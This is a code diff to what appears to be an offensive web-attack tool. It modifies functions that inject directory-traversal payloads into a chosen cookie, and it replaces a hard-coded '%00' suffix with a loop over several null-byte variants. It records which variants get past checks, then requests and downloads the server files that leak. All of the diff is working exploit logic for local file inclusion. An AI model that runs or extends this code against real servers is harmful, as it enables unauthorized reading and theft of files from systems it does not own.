@@ -21,7 +21,7 @@ from core.methods.session import session
 from http.cookies import SimpleCookie
 import requests, sys
 from core.colors import color
-from core.variables import payloadlist
+from core.variables import payloadlist, nullchars
 from core.methods.filecheck import filecheck
 from core.methods.loot import download
 
@@ -57,6 +57,7 @@ def readCookie(url):
 def determine_payloads_cookie(url, cookie, selected ,verbose, depth, paylist, file):
     s = session()
     payloads = []
+    nullbytes = []
     s.cookies = cookie
     con2 = s.get(url).content
     for i in paylist:
@@ -69,25 +70,30 @@ def determine_payloads_cookie(url, cookie, selected ,verbose, depth, paylist, fi
                 j+=1
             requestlist = []
             s.cookies.set(selected, traverse + file)
+            p = traverse + file
             r = s.get(url)
-            requestlist.append(r)
-            s.cookies.set(selected, traverse + file + "%00")
-            r = s.get(url)
-            requestlist.append(r)
+            requestlist.append((r, p, ""))
+            for nb in nullchars:
+                s.cookies.set(selected, traverse + file + nb)
+                p = traverse + file + nb
+                r = s.get(url)
+                requestlist.append((r, p, nb))
             found = False
-            for r in requestlist:
+            for (r, p, nb) in requestlist:
                 if str(r.status_code).startswith("2") or r.status_code == 302 or r.status_code == 403:
-                    if filecheck(r.content, con2):
+                    if filecheck(r.content, con2, p):
                         payloads.append(i)
+                        if nb != "":
+                            nullbytes.append(nb)
                         found = True
                         print(color.RD + "[pl]" + color.END + color.O + " " + str(r.status_code) + color.END + " " + i)
             d+=1
             if found:
                 break
     
-    return payloads
+    return (payloads, nullbytes)
 
-def cookie_attack(url, cookie, selected, files, dirs, depth, verbose, dl, summary, selected_payloads):
+def cookie_attack(url, cookie, selected, files, dirs, depth, verbose, dl, summary, selected_payloads, selected_nullbytes):
     s = session()
     found=[]
     urls = []
@@ -103,21 +109,24 @@ def cookie_attack(url, cookie, selected, files, dirs, depth, verbose, dl, summar
                         traverse+=i
                         j+=1
                     requestlist = []
-                    val1 = traverse + dir + file
-                    #s.cookies.clear()
-                    s.cookies.set(selected, traverse + dir + file)
-                    r = s.get(url)
-                    requestlist.append((r, val1))
-                    val2 = traverse + dir + file + "%00"
-                    #s.cookies.clear()
-                    s.cookies.set(selected, traverse + dir + file + "%00")
-                    r = s.get(url)
-                    requestlist.append((r, val2))
+                    if selected_nullbytes == []:
+                        val1 = traverse + dir + file
+                        #s.cookies.clear()
+                        s.cookies.set(selected, traverse + dir + file)
+                        r = s.get(url)
+                        requestlist.append((r, val1))
+                    else:
+                        for nb in selected_nullbytes:
+                            val2 = traverse + dir + file + nb
+                            #s.cookies.clear()
+                            s.cookies.set(selected, traverse + dir + file + nb)
+                            r = s.get(url)
+                            requestlist.append((r, val2))
                     for (r, val) in requestlist:
                         #s.cookies.clear()
                         s.cookies.set(selected, val)
                         if str(r.status_code).startswith("2") or r.status_code == 302:
-                            if filecheck(r.content, con2):
+                            if filecheck(r.content, con2, val):
                                 print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"cookie"+color.END+"="+val)
                                 if dl and dir+file not in found:
                                     download(r.url,dir+file,cookie=s.cookies)
